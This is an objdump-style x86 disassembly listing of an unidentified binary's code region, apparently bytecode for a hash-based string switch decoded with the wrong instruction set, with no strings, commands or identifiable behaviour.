  403664:	3b 65 0a             	cmp    0xa(%ebp),%esp
  403667:	00 00                	add    %al,(%eax)
  403669:	38 5c 3a 00          	cmp    %bl,0x0(%edx,%edi,1)
  40366d:	00 08                	add    %cl,(%eax)
  40366f:	20 a5 da fa 51 3b    	and    %ah,0x3b51fada(%ebp)
  403675:	76 07                	jbe    0x40367e
  403677:	00 00                	add    %al,(%eax)
  403679:	08 20                	or     %ah,(%eax)
  40367b:	48                   	dec    %eax
  40367c:	c8 cd 52 3b          	enter  $0x52cd,$0x3b
  403680:	2e 11 00             	adc    %eax,%cs:(%eax)
  403683:	00 08                	add    %cl,(%eax)
  403685:	20 72 27             	and    %dh,0x27(%edx)
  403688:	de 58 3b             	ficomps 0x3b(%eax)
  40368b:	75 07                	jne    0x403694
  40368d:	00 00                	add    %al,(%eax)
  40368f:	38 36                	cmp    %dh,(%esi)
  403691:	3a 00                	cmp    (%eax),%al
  403693:	00 08                	add    %cl,(%eax)
  403695:	20 e6                	and    %ah,%dh
  403697:	82 a4 6c 42 8f 00 00 	andb   $0x0,0x8f42(%esp,%ebp,2)
  40369e:	00 
  40369f:	08 20                	or     %ah,(%eax)
  4036a1:	55                   	push   %ebp
  4036a2:	00 b3 63 35 3e 08    	add    %dh,0x83e3563(%ebx)
  4036a8:	20 33                	and    %dh,(%ebx)
  4036aa:	25 e8 5e 35 1b       	and    $0x1b355ee8,%eax
  4036af:	08 20                	or     %ah,(%eax)
  4036b1:	11 3d 1c 5c 3b 20    	adc    %edi,0x203b5c1c
  4036b7:	07                   	pop    %es
  4036b8:	00 00                	add    %al,(%eax)
  4036ba:	08 20                	or     %ah,(%eax)
  4036bc:	33 25 e8 5e 3b e4    	xor    0xe43b5ee8,%esp
  4036c2:	0d 00 00 38 00       	or     $0x380000,%eax
  4036c7:	3a 00                	cmp    (%eax),%al
  4036c9:	00 08                	add    %cl,(%eax)
  4036cb:	20 bc 51 ec 5e 3b 89 	and    %bh,-0x76c4a114(%ecx,%edx,2)
  4036d2:	10 00                	adc    %al,(%eax)
  4036d4:	00 08                	add    %cl,(%eax)
  4036d6:	20 55 00             	and    %dl,0x0(%ebp)
  4036d9:	b3 63                	mov    $0x63,%bl
  4036db:	3b 7a 11             	cmp    0x11(%edx),%edi
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	38 e5                	cmp    %ah,%ch
  4036e2:	39 00                	cmp    %eax,(%eax)
  4036e4:	00 08                	add    %cl,(%eax)
  4036e6:	20 b1 99 f3 68 35    	and    %dh,0x3568f399(%ecx)
  4036ec:	1b 08                	sbb    (%eax),%ecx
  4036ee:	20 e8                	and    %ch,%al
  4036f0:	89 39                	mov    %edi,(%ecx)
  4036f2:	67 3b a3 06 00       	cmp    0x6(%bp,%di),%esp
  4036f7:	00 08                	add    %cl,(%eax)
  4036f9:	20 b1 99 f3 68 3b    	and    %dh,0x3b68f399(%ecx)
  4036ff:	e0 09                	loopne 0x40370a
  403701:	00 00                	add    %al,(%eax)
  403703:	38 c2                	cmp    %al,%dl
  403705:	39 00                	cmp    %eax,(%eax)
  403707:	00 08                	add    %cl,(%eax)
  403709:	20 a7 f3 fe 68 3b    	and    %ah,0x3b68fef3(%edi)
  40370f:	8d 0a                	lea    (%edx),%ecx
  403711:	00 00                	add    %al,(%eax)
  403713:	08 20                	or     %ah,(%eax)
  403715:	19 bb 64 69 3b da    	sbb    %edi,-0x25c4969c(%ebx)
  40371b:	09 00                	or     %eax,(%eax)
  40371d:	00 08                	add    %cl,(%eax)
  40371f:	20 e6                	and    %ah,%dh
  403721:	82 a4 6c 3b 6e 07 00 	andb   $0x0,0x76e3b(%esp,%ebp,2)
  403728:	00 
  403729:	38 9c 39 00 00 08 20 	cmp    %bl,0x20080000(%ecx,%edi,1)
  403730:	20 ea                	and    %ch,%dl
  403732:	05 73 35 3e 08       	add    $0x83e3573,%eax
  403737:	20 5f 5b             	and    %bl,0x5b(%edi)
  40373a:	69 70 35 1b 08 20 94 	imul   $0x9420081b,0x35(%eax),%esi
  403741:	0e                   	push   %cs
  403742:	23 6e 3b             	and    0x3b(%esi),%ebp
  403745:	4f                   	dec    %edi
  403746:	0c 00                	or     $0x0,%al
  403748:	00 08                	add    %cl,(%eax)
  40374a:	20 5f 5b             	and    %bl,0x5b(%edi)
  40374d:	69 70 3b 0d 0a 00 00 	imul   $0xa0d,0x3b(%eax),%esi
  403754:	38 71 39             	cmp    %dh,0x39(%ecx)
  403757:	00 00                	add    %al,(%eax)
  403759:	08 20                	or     %ah,(%eax)
  40375b:	62 2d b4 71 3b 01    	bound  %ebp,0x13b71b4
  403761:	09 00                	or     %eax,(%eax)
  403763:	00 08                	add    %cl,(%eax)
  403765:	20 20                	and    %ah,(%eax)
  403767:	ea 05 73 3b 91 07 00 	ljmp   $0x7,$0x913b7305
  40376e:	00 38                	add    %bh,(%eax)
  403770:	56                   	push   %esi
  403771:	39 00                	cmp    %eax,(%eax)
  403773:	00 08                	add    %cl,(%eax)
  403775:	20 8f 84 89 76 35    	and    %cl,0x35768984(%edi)
  40377b:	1b 08                	sbb    (%eax),%ecx
  40377d:	20 af 76 f5 74 3b    	and    %ch,0x3b74f576(%edi)
  403783:	76 0d                	jbe    0x403792
  403785:	00 00                	add    %al,(%eax)
  403787:	08 20                	or     %ah,(%eax)
  403789:	8f 84 89 76 3b 52 0e 	pop    0xe523b76(%ecx,%ecx,4)
  403790:	00 00                	add    %al,(%eax)
  403792:	38 33                	cmp    %dh,(%ebx)
  403794:	39 00                	cmp    %eax,(%eax)
  403796:	00 08                	add    %cl,(%eax)
  403798:	20 8b 7b 81 79 3b    	and    %cl,0x3b79817b(%ebx)
  40379e:	6f                   	outsl  %ds:(%esi),(%dx)
  40379f:	08 00                	or     %al,(%eax)
  4037a1:	00 08                	add    %cl,(%eax)
  4037a3:	20 7f 30             	and    %bh,0x30(%edi)
  4037a6:	22 7b 3b             	and    0x3b(%ebx),%bh
  4037a9:	8e 08                	mov    (%eax),%cs
  4037ab:	00 00                	add    %al,(%eax)
  4037ad:	08 20                	or     %ah,(%eax)
  4037af:	42                   	inc    %edx
  4037b0:	ff 04 7e             	incl   (%esi,%edi,2)
  4037b3:	3b 94 09 00 00 38 0d 	cmp    0xd380000(%ecx,%ecx,1),%edx
  4037ba:	39 00                	cmp    %eax,(%eax)
  4037bc:	00 08                	add    %cl,(%eax)
  4037be:	20 a1 69 19 ba 42    	and    %ah,0x42ba1969(%ecx)
  4037c4:	5d                   	pop    %ebp
  4037c5:	02 00                	add    (%eax),%al
  4037c7:	00 08                	add    %cl,(%eax)
  4037c9:	20 a1 09 fb 97 42    	and    %ah,0x4297fb09(%ecx)
  4037cf:	29 01                	sub    %eax,(%ecx)
  4037d1:	00 00                	add    %al,(%eax)
  4037d3:	08 20                	or     %ah,(%eax)
  4037d5:	68 43 56 87 42       	push   $0x42875643
  4037da:	8f 00                	pop    (%eax)
  4037dc:	00 00                	add    %al,(%eax)
  4037de:	08 20                	or     %ah,(%eax)
  4037e0:	bd 78 3d 82 35       	mov    $0x35823d78,%ebp
  4037e5:	3e 08 20             	or     %ah,%ds:(%eax)
  4037e8:	08 c1                	or     %al,%cl
  4037ea:	80 80 35 1b 08 20 a9 	addb   $0xa9,0x20081b35(%eax)
  4037f1:	f0 b7 7f             	lock mov $0x7f,%bh
  4037f4:	3b e5                	cmp    %ebp,%esp
  4037f6:	04 00                	add    $0x0,%al
  4037f8:	00 08                	add    %cl,(%eax)
  4037fa:	20 08                	and    %cl,(%eax)
  4037fc:	c1 80 80 3b 3b 07 00 	roll   $0x0,0x73b3b80(%eax)
  403803:	00 38                	add    %bh,(%eax)
  403805:	c1 38 00             	sarl   $0x0,(%eax)
  403808:	00 08                	add    %cl,(%eax)
  40380a:	20 38                	and    %bh,(%eax)
  40380c:	c1 26 82             	shll   $0x82,(%esi)
  40380f:	3b 0f                	cmp    (%edi),%ecx
  403811:	0e                   	push   %cs
  403812:	00 00                	add    %al,(%eax)
  403814:	08 20                	or     %ah,(%eax)
  403816:	bd 78 3d 82 3b       	mov    $0x3b823d78,%ebp
  40381b:	82 0e 00             	orb    $0x0,(%esi)
  40381e:	00 38                	add    %bh,(%eax)
  403820:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403821:	38 00                	cmp    %al,(%eax)
  403823:	00 08                	add    %cl,(%eax)
  403825:	20 7c 7f 6f          	and    %bh,0x6f(%edi,%edi,2)
  403829:	82 35 1b 08 20 52 41 	xorb   $0x41,0x5220081b
  403830:	45                   	inc    %ebp
  403831:	82 3b b4             	cmpb   $0xb4,(%ebx)
  403834:	06                   	push   %es
  403835:	00 00                	add    %al,(%eax)
  403837:	08 20                	or     %ah,(%eax)
  403839:	7c 7f                	jl     0x4038ba
  40383b:	6f                   	outsl  %ds:(%esi),(%dx)
  40383c:	82 3b 90             	cmpb   $0x90,(%ebx)
  40383f:	07                   	pop    %es
  403840:	00 00                	add    %al,(%eax)
  403842:	38 83 38 00 00 08    	cmp    %al,0x8000038(%ebx)
  403848:	20 1b                	and    %bl,(%ebx)
  40384a:	fd                   	std
  40384b:	c2 85 3b             	ret    $0x3b85
  40384e:	cd 0e                	int    $0xe
  403850:	00 00                	add    %al,(%eax)
  403852:	08 20                	or     %ah,(%eax)
  403854:	d9 2c 52             	fldcw  (%edx,%edx,2)
  403857:	86 3b                	xchg   %bh,(%ebx)
  403859:	be 0f 00 00 08       	mov    $0x800000f,%esi
  40385e:	20 68 43             	and    %ch,0x43(%eax)
  403861:	56                   	push   %esi
  403862:	87 3b                	xchg   %edi,(%ebx)
  403864:	b6 09                	mov    $0x9,%dh
  403866:	00 00                	add    %al,(%eax)
  403868:	38 5d 38             	cmp    %bl,0x38(%ebp)
  40386b:	00 00                	add    %al,(%eax)
  40386d:	08 20                	or     %ah,(%eax)
  40386f:	68 a3 21 8e 35       	push   $0x358e21a3
  403874:	3e 08 20             	or     %ah,%ds:(%eax)
  403877:	76 3b                	jbe    0x4038b4
  403879:	8a 88 35 1b 08 20    	mov    0x20081b35(%eax),%cl
  40387f:	4f                   	dec    %edi
  403880:	a9 05 88 3b 74       	test   $0x743b8805,%eax
  403885:	07                   	pop    %es
  403886:	00 00                	add    %al,(%eax)
  403888:	08 20                	or     %ah,(%eax)
  40388a:	76 3b                	jbe    0x4038c7
  40388c:	8a 88 3b 38 0e 00    	mov    0xe383b(%eax),%cl
  403892:	00 38                	add    %bh,(%eax)
  403894:	32 38                	xor    (%eax),%bh
  403896:	00 00                	add    %al,(%eax)
  403898:	08 20                	or     %ah,(%eax)
  40389a:	29 22                	sub    %esp,(%edx)
  40389c:	78 8c                	js     0x40382a
  40389e:	3b d4                	cmp    %esp,%edx
  4038a0:	0d 00 00 08 20       	or     $0x20080000,%eax
  4038a5:	68 a3 21 8e 3b       	push   $0x3b8e21a3
  4038aa:	c3                   	ret
  4038ab:	04 00                	add    $0x0,%al
  4038ad:	00 38                	add    %bh,(%eax)
  4038af:	17                   	pop    %ss
  4038b0:	38 00                	cmp    %al,(%eax)
  4038b2:	00 08                	add    %cl,(%eax)
  4038b4:	20 28                	and    %ch,(%eax)
  4038b6:	3e f6 91 35 1b 08 20 	notb   %ds:0x20081b35(%ecx)
  4038bd:	bc 84 31 8f 3b       	mov    $0x3b8f3184,%esp
  4038c2:	33 0d 00 00 08 20    	xor    0x20080000,%ecx
  4038c8:	28 3e                	sub    %bh,(%esi)
  4038ca:	f6 91 3b 8b 04 00    	notb   0x48b3b(%ecx)
  4038d0:	00 38                	add    %bh,(%eax)
  4038d2:	f4                   	hlt
  4038d3:	37                   	aaa
  4038d4:	00 00                	add    %al,(%eax)
  4038d6:	08 20                	or     %ah,(%eax)
  4038d8:	9c                   	pushf
  4038d9:	80 5c 97 3b c4       	sbbb   $0xc4,0x3b(%edi,%edx,4)
  4038de:	0c 00                	or     $0x0,%al
  4038e0:	00 08                	add    %cl,(%eax)
  4038e2:	20 9d 8f e2 97 3b    	and    %bl,0x3b97e28f(%ebp)
  4038e8:	7d 06                	jge    0x4038f0
  4038ea:	00 00                	add    %al,(%eax)
  4038ec:	08 20                	or     %ah,(%eax)
  4038ee:	a1 09 fb 97 3b       	mov    0x3b97fb09,%eax
  4038f3:	b5 05                	mov    $0x5,%ch
  4038f5:	00 00                	add    %al,(%eax)
  4038f7:	38 ce                	cmp    %cl,%dh
  4038f9:	37                   	aaa
  4038fa:	00 00                	add    %al,(%eax)
  4038fc:	08 20                	or     %ah,(%eax)
  4038fe:	81 b0 cf a9 42 8f 00 	xorl   $0x8000000,-0x70bd5631(%eax)
  403905:	00 00 08 
  403908:	20 2c 1f             	and    %ch,(%edi,%ebx,1)
  40390b:	38 9f 35 3e 08 20    	cmp    %bl,0x20083e35(%edi)
  403911:	4b                   	dec    %ebx
  403912:	9c                   	pushf
  403913:	65 9b                	gs fwait
  403915:	35 1b 08 20 81       	xor    $0x8120081b,%eax
  40391a:	da 6b 99             	fisubrl -0x67(%ebx)
  40391d:	3b 94 0d 00 00 08 20 	cmp    0x20080000(%ebp,%ecx,1),%edx
  403924:	4b                   	dec    %ebx
  403925:	9c                   	pushf
  403926:	65 9b                	gs fwait
  403928:	3b fa                	cmp    %edx,%edi
  40392a:	0b 00                	or     (%eax),%eax
  40392c:	00 38                	add    %bh,(%eax)
  40392e:	98                   	cwtl
  40392f:	37                   	aaa
  403930:	00 00                	add    %al,(%eax)
  403932:	08 20                	or     %ah,(%eax)
  403934:	75 99                	jne    0x4038cf
  403936:	79 9c                	jns    0x4038d4
  403938:	3b 3d 07 00 00 08    	cmp    0x8000007,%edi
  40393e:	20 2c 1f             	and    %ch,(%edi,%ebx,1)
  403941:	38 9f 3b 8e 05 00    	cmp    %bl,0x58e3b(%edi)
  403947:	00 38                	add    %bh,(%eax)
  403949:	7d 37                	jge    0x403982
  40394b:	00 00                	add    %al,(%eax)
  40394d:	08 20                	or     %ah,(%eax)
  40394f:	dd 45 40             	fldl   0x40(%ebp)
  403952:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403953:	35 1b 08 20 96       	xor    $0x9620081b,%eax
  403958:	ee                   	out    %al,(%dx)
  403959:	02 a2 3b 3d 0e 00    	add    0xe3d3b(%edx),%ah
  40395f:	00 08                	add    %cl,(%eax)
  403961:	20 dd                	and    %bl,%ch
  403963:	45                   	inc    %ebp
  403964:	40                   	inc    %eax
  403965:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403966:	3b e2                	cmp    %edx,%esp
  403968:	0c 00                	or     $0x0,%al
  40396a:	00 38                	add    %bh,(%eax)
  40396c:	5a                   	pop    %edx
  40396d:	37                   	aaa
  40396e:	00 00                	add    %al,(%eax)
  403970:	08 20                	or     %ah,(%eax)
  403972:	e9 a6 59 a5 3b       	jmp    0x3be5931d
  403977:	42                   	inc    %edx
  403978:	06                   	push   %es
  403979:	00 00                	add    %al,(%eax)
  40397b:	08 20                	or     %ah,(%eax)
  40397d:	fc                   	cld
  40397e:	b2 d3                	mov    $0xd3,%dl
  403980:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403981:	3b fc                	cmp    %esp,%edi
  403983:	04 00                	add    $0x0,%al
  403985:	00 08                	add    %cl,(%eax)
  403987:	20 81 b0 cf a9 3b    	and    %al,0x3ba9cfb0(%ecx)
  40398d:	1c 0a                	sbb    $0xa,%al
  40398f:	00 00                	add    %al,(%eax)
  403991:	38 34 37             	cmp    %dh,(%edi,%esi,1)
  403994:	00 00                	add    %al,(%eax)
  403996:	08 20                	or     %ah,(%eax)
  403998:	cb                   	lret
  403999:	d6                   	salc
  40399a:	d4 b4                	aam    $0xb4
  40399c:	35 3e 08 20 5c       	xor    $0x5c20083e,%eax
  4039a1:	3f                   	aas
  4039a2:	8f                   	(bad)
  4039a3:	ac                   	lods   %ds:(%esi),%al
  4039a4:	35 1b 08 20 4a       	xor    $0x4a20081b,%eax
  4039a9:	92                   	xchg   %eax,%edx
  4039aa:	8e ab 3b 2e 08 00    	mov    0x82e3b(%ebx),%gs
  4039b0:	00 08                	add    %cl,(%eax)
  4039b2:	20 5c 3f 8f          	and    %bl,-0x71(%edi,%edi,1)
  4039b6:	ac                   	lods   %ds:(%esi),%al
  4039b7:	3b 17                	cmp    (%edi),%edx
  4039b9:	0b 00                	or     (%eax),%eax
  4039bb:	00 38                	add    %bh,(%eax)
  4039bd:	09 37                	or     %esi,(%edi)
  4039bf:	00 00                	add    %al,(%eax)
  4039c1:	08 20                	or     %ah,(%eax)
  4039c3:	12 2c 70             	adc    (%eax,%esi,2),%ch
  4039c6:	ae                   	scas   %es:(%edi),%al
  4039c7:	3b ed                	cmp    %ebp,%ebp
  4039c9:	06                   	push   %es
  4039ca:	00 00                	add    %al,(%eax)
  4039cc:	08 20                	or     %ah,(%eax)
  4039ce:	cb                   	lret
  4039cf:	d6                   	salc
  4039d0:	d4 b4                	aam    $0xb4
  4039d2:	3b 37                	cmp    (%edi),%esi
  4039d4:	0c 00                	or     $0x0,%al
  4039d6:	00 38                	add    %bh,(%eax)
  4039d8:	ee                   	out    %al,(%dx)
  4039d9:	36 00 00             	add    %al,%ss:(%eax)
  4039dc:	08 20                	or     %ah,(%eax)
  4039de:	e1 a5                	loope  0x403985
  4039e0:	05 b6 35 1b 08       	add    $0x81b35b6,%eax
  4039e5:	20 49 25             	and    %cl,0x25(%ecx)
  4039e8:	d1 b5 3b 45 0d 00    	shll   $1,0xd453b(%ebp)
  4039ee:	00 08                	add    %cl,(%eax)
  4039f0:	20 e1                	and    %ah,%cl
  4039f2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4039f3:	05 b6 3b 38 03       	add    $0x3383bb6,%eax
  4039f8:	00 00                	add    %al,(%eax)
  4039fa:	38 cb                	cmp    %cl,%bl
  4039fc:	36 00 00             	add    %al,%ss:(%eax)
  4039ff:	08 20                	or     %ah,(%eax)
  403a01:	93                   	xchg   %eax,%ebx
  403a02:	7b 40                	jnp    0x403a44
  403a04:	b6 3b                	mov    $0x3b,%dh
  403a06:	7e 0d                	jle    0x403a15
  403a08:	00 00                	add    %al,(%eax)
  403a0a:	08 20                	or     %ah,(%eax)
  403a0c:	d4 95                	aam    $0x95
  403a0e:	6e                   	outsb  %ds:(%esi),(%dx)
  403a0f:	b8 3b 58 04 00       	mov    $0x4583b,%eax
  403a14:	00 08                	add    %cl,(%eax)
  403a16:	20 a1 69 19 ba 3b    	and    %ah,0x3bba1969(%ecx)
  403a1c:	e8 02 00 00 38       	call   0x38403a23
  403a21:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a22:	36 00 00             	add    %al,%ss:(%eax)
  403a25:	08 20                	or     %ah,(%eax)
  403a27:	71 ed                	jno    0x403a16
  403a29:	2e db 42 29          	fildl  %cs:0x29(%edx)
  403a2d:	01 00                	add    %eax,(%eax)
  403a2f:	00 08                	add    %cl,(%eax)
  403a31:	20 a7 b8 9b cd 42    	and    %ah,0x42cd9bb8(%edi)
  403a37:	8f 00                	pop    (%eax)
  403a39:	00 00                	add    %al,(%eax)
  403a3b:	08 20                	or     %ah,(%eax)
  403a3d:	27                   	daa
  403a3e:	51                   	push   %ecx
  403a3f:	8a c1                	mov    %cl,%al
  403a41:	35 3e 08 20 cf       	xor    $0xcf20083e,%eax
  403a46:	82 65 c0 35          	andb   $0x35,-0x40(%ebp)
  403a4a:	1b 08                	sbb    (%eax),%ecx
  403a4c:	20 22                	and    %ah,(%edx)
  403a4e:	4d                   	dec    %ebp
  403a4f:	97                   	xchg   %eax,%edi
  403a50:	bf 3b b7 06 00       	mov    $0x6b73b,%edi
  403a55:	00 08                	add    %cl,(%eax)
  403a57:	20 cf                	and    %cl,%bh
  403a59:	82 65 c0 3b          	andb   $0x3b,-0x40(%ebp)
  403a5d:	b5 09                	mov    $0x9,%ch
  403a5f:	00 00                	add    %al,(%eax)
  403a61:	38 64 36 00          	cmp    %ah,0x0(%esi,%esi,1)
  403a65:	00 08                	add    %cl,(%eax)
  403a67:	20 69 69             	and    %ch,0x69(%ecx)
  403a6a:	0d c1 3b 0a 0b       	or     $0xb0a3bc1,%eax
  403a6f:	00 00                	add    %al,(%eax)
  403a71:	08 20                	or     %ah,(%eax)
  403a73:	27                   	daa
  403a74:	51                   	push   %ecx
  403a75:	8a c1                	mov    %cl,%al
  403a77:	3b aa 05 00 00 38    	cmp    0x38000005(%edx),%ebp
  403a7d:	49                   	dec    %ecx
  403a7e:	36 00 00             	add    %al,%ss:(%eax)
  403a81:	08 20                	or     %ah,(%eax)
  403a83:	bf d7 d0 c5 35       	mov    $0x35c5d0d7,%edi
  403a88:	1b 08                	sbb    (%eax),%ecx
  403a8a:	20 ad 1f 89 c2 3b    	and    %ch,0x3bc2891f(%ebp)
  403a90:	c1 09 00             	rorl   $0x0,(%ecx)
  403a93:	00 08                	add    %cl,(%eax)
  403a95:	20 bf d7 d0 c5 3b    	and    %bh,0x3bc5d0d7(%edi)
  403a9b:	b1 05                	mov    $0x5,%cl
  403a9d:	00 00                	add    %al,(%eax)
  403a9f:	38 26                	cmp    %ah,(%esi)
  403aa1:	36 00 00             	add    %al,%ss:(%eax)
  403aa4:	08 20                	or     %ah,(%eax)
  403aa6:	6f                   	outsl  %ds:(%esi),(%dx)
  403aa7:	63 39                	arpl   %edi,(%ecx)
  403aa9:	c8 3b 84 07          	enter  $0x843b,$0x7
  403aad:	00 00                	add    %al,(%eax)
  403aaf:	08 20                	or     %ah,(%eax)
  403ab1:	19 98 44 ca 3b 76    	sbb    %ebx,0x763bca44(%eax)
  403ab7:	0d 00 00 08 20       	or     $0x20080000,%eax
  403abc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403abd:	b8 9b cd 3b a5       	mov    $0xa53bcd9b,%eax
  403ac2:	09 00                	or     %eax,(%eax)
  403ac4:	00 38                	add    %bh,(%eax)
  403ac6:	00 36                	add    %dh,(%esi)
  403ac8:	00 00                	add    %al,(%eax)
  403aca:	08 20                	or     %ah,(%eax)
  403acc:	1a 4e ee             	sbb    -0x12(%esi),%cl
  403acf:	d2 35 3e 08 20 8e    	shlb   %cl,0x8e20083e
  403ad5:	1f                   	pop    %ds
  403ad6:	57                   	push   %edi
  403ad7:	d1 35 1b 08 20 b4    	shll   $1,0xb420081b
  403add:	ef                   	out    %eax,(%dx)
  403ade:	9a cf 3b a5 01 00 00 	lcall  $0x0,$0x1a53bcf
  403ae5:	08 20                	or     %ah,(%eax)
  403ae7:	8e 1f                	mov    (%edi),%ds
  403ae9:	57                   	push   %edi
  403aea:	d1 3b                	sarl   $1,(%ebx)
  403aec:	00 08                	add    %cl,(%eax)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	38 d5                	cmp    %dl,%ch
  403af2:	35 00 00 08 20       	xor    $0x20080000,%eax
  403af7:	70 fd                	jo     0x403af6
  403af9:	8b d2                	mov    %edx,%edx
  403afb:	3b ba 0a 00 00 08    	cmp    0x800000a(%edx),%edi
  403b01:	20 1a                	and    %bl,(%edx)
  403b03:	4e                   	dec    %esi
  403b04:	ee                   	out    %al,(%dx)
  403b05:	d2 3b                	sarb   %cl,(%ebx)
  403b07:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403b08:	07                   	pop    %es
  403b09:	00 00                	add    %al,(%eax)
  403b0b:	38 ba 35 00 00 08    	cmp    %bh,0x8000035(%edx)
  403b11:	20 0c 7c             	and    %cl,(%esp,%edi,2)
  403b14:	e2 d8                	loop   0x403aee
  403b16:	35 1b 08 20 70       	xor    $0x7020081b,%eax
  403b1b:	fb                   	sti
  403b1c:	5f                   	pop    %edi
  403b1d:	d8 3b                	fdivrs (%ebx)
  403b1f:	26 0c 00             	es or  $0x0,%al
  403b22:	00 08                	add    %cl,(%eax)
  403b24:	20 0c 7c             	and    %cl,(%esp,%edi,2)
  403b27:	e2 d8                	loop   0x403b01
  403b29:	3b 90 09 00 00 38    	cmp    0x38000009(%eax),%edx
  403b2f:	97                   	xchg   %eax,%edi
  403b30:	35 00 00 08 20       	xor    $0x20080000,%eax
  403b35:	91                   	xchg   %eax,%ecx
  403b36:	d9 f3                	fpatan
  403b38:	d9 3b                	fnstcw (%ebx)
  403b3a:	dc 07                	faddl  (%edi)
  403b3c:	00 00                	add    %al,(%eax)
  403b3e:	08 20                	or     %ah,(%eax)
  403b40:	0b 79 84             	or     -0x7c(%ecx),%edi
  403b43:	da 3b                	fidivrl (%ebx)
  403b45:	10 08                	adc    %cl,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	08 20                	or     %ah,(%eax)
  403b4b:	71 ed                	jno    0x403b3a
  403b4d:	2e db 3b             	fstpt  %cs:(%ebx)
  403b50:	94                   	xchg   %eax,%esp
  403b51:	09 00                	or     %eax,(%eax)
  403b53:	00 38                	add    %bh,(%eax)
  403b55:	71 35                	jno    0x403b8c
  403b57:	00 00                	add    %al,(%eax)
  403b59:	08 20                	or     %ah,(%eax)
  403b5b:	f3 53                	repz push %ebx
  403b5d:	7d ea                	jge    0x403b49
  403b5f:	42                   	inc    %edx
  403b60:	8f 00                	pop    (%eax)
  403b62:	00 00                	add    %al,(%eax)
  403b64:	08 20                	or     %ah,(%eax)
  403b66:	93                   	xchg   %eax,%ebx
  403b67:	b7 ad                	mov    $0xad,%bh
  403b69:	e5 35                	in     $0x35,%eax
  403b6b:	3e 08 20             	or     %ah,%ds:(%eax)
  403b6e:	c8 06 9c de          	enter  $0x9c06,$0xde
  403b72:	35 1b 08 20 35       	xor    $0x3520081b,%eax
  403b77:	52                   	push   %edx
  403b78:	38 dc                	cmp    %bl,%ah
  403b7a:	3b 5c 07 00          	cmp    0x0(%edi,%eax,1),%ebx
  403b7e:	00 08                	add    %cl,(%eax)
  403b80:	20 c8                	and    %cl,%al
  403b82:	06                   	push   %es
  403b83:	9c                   	pushf
  403b84:	de 3b                	fidivrs (%ebx)
  403b86:	bb 0c 00 00 38       	mov    $0x3800000c,%ebx
  403b8b:	3b 35 00 00 08 20    	cmp    0x20080000,%esi
  403b91:	4d                   	dec    %ebp
  403b92:	18 82 df 3b 5b 0b    	sbb    %al,0xb5b3bdf(%edx)
  403b98:	00 00                	add    %al,(%eax)
  403b9a:	08 20                	or     %ah,(%eax)
  403b9c:	93                   	xchg   %eax,%ebx
  403b9d:	b7 ad                	mov    $0xad,%bh
  403b9f:	e5 3b                	in     $0x3b,%eax
  403ba1:	42                   	inc    %edx
  403ba2:	04 00                	add    $0x0,%al
  403ba4:	00 38                	add    %bh,(%eax)
  403ba6:	20 35 00 00 08 20    	and    %dh,0x20080000
  403bac:	ce                   	into
  403bad:	10 90 e6 35 1b 08    	adc    %dl,0x81b35e6(%eax)
  403bb3:	20 40 20             	and    %al,0x20(%eax)
  403bb6:	3f                   	aas
  403bb7:	e6 3b                	out    %al,$0x3b
  403bb9:	8a 01                	mov    (%ecx),%al
  403bbb:	00 00                	add    %al,(%eax)
  403bbd:	08 20                	or     %ah,(%eax)
  403bbf:	ce                   	into
  403bc0:	10 90 e6 3b 3d 07    	adc    %dl,0x73d3be6(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	38 fd                	cmp    %bh,%ch
  403bca:	34 00                	xor    $0x0,%al
  403bcc:	00 08                	add    %cl,(%eax)
  403bce:	20 88 94 5e e7 3b    	and    %cl,0x3be75e94(%eax)
  403bd4:	9b                   	fwait
  403bd5:	0b 00                	or     (%eax),%eax
  403bd7:	00 08                	add    %cl,(%eax)
  403bd9:	20 09                	and    %cl,(%ecx)
  403bdb:	61                   	popa
  403bdc:	89 e8                	mov    %ebp,%eax
  403bde:	3b d1                	cmp    %ecx,%edx
  403be0:	00 00                	add    %al,(%eax)
  403be2:	00 08                	add    %cl,(%eax)
  403be4:	20 f3                	and    %dh,%bl
  403be6:	53                   	push   %ebx
  403be7:	7d ea                	jge    0x403bd3
  403be9:	3b 2f                	cmp    (%edi),%ebp
  403beb:	01 00                	add    %eax,(%eax)
  403bed:	00 38                	add    %bh,(%eax)
  403bef:	d7                   	xlat   %ds:(%ebx)
  403bf0:	34 00                	xor    $0x0,%al
  403bf2:	00 08                	add    %cl,(%eax)
  403bf4:	20 fc                	and    %bh,%ah
  403bf6:	5e                   	pop    %esi
  403bf7:	7b f0                	jnp    0x403be9
  403bf9:	35 49 08 20 a4       	xor    $0xa4200849,%eax
  403bfe:	2b 1b                	sub    (%ebx),%ebx
  403c00:	ed                   	in     (%dx),%eax
  403c01:	35 1b 08 20 46       	xor    $0x4620081b,%eax
  403c06:	df 9d eb 3b fc 0a    	fistps 0xafc3beb(%ebp)
  403c0c:	00 00                	add    %al,(%eax)
  403c0e:	08 20                	or     %ah,(%eax)
  403c10:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403c11:	2b 1b                	sub    (%ebx),%ebx
  403c13:	ed                   	in     (%dx),%eax
  403c14:	3b 8f 03 00 00 38    	cmp    0x38000003(%edi),%ecx
  403c1a:	ac                   	lods   %ds:(%esi),%al
  403c1b:	34 00                	xor    $0x0,%al
  403c1d:	00 08                	add    %cl,(%eax)
  403c1f:	20 9f 66 ca ed 3b    	and    %bl,0x3bedca66(%edi)
  403c25:	c8 0b 00 00          	enter  $0xb,$0x0
  403c29:	08 20                	or     %ah,(%eax)
  403c2b:	6c                   	insb   (%dx),%es:(%edi)
  403c2c:	00 f9                	add    %bh,%cl
  403c2e:	ed                   	in     (%dx),%eax
  403c2f:	3b 4a 03             	cmp    0x3(%edx),%ecx
  403c32:	00 00                	add    %al,(%eax)
  403c34:	08 20                	or     %ah,(%eax)
  403c36:	fc                   	cld
  403c37:	5e                   	pop    %esi
  403c38:	7b f0                	jnp    0x403c2a
  403c3a:	3b 4c 05 00          	cmp    0x0(%ebp,%eax,1),%ecx
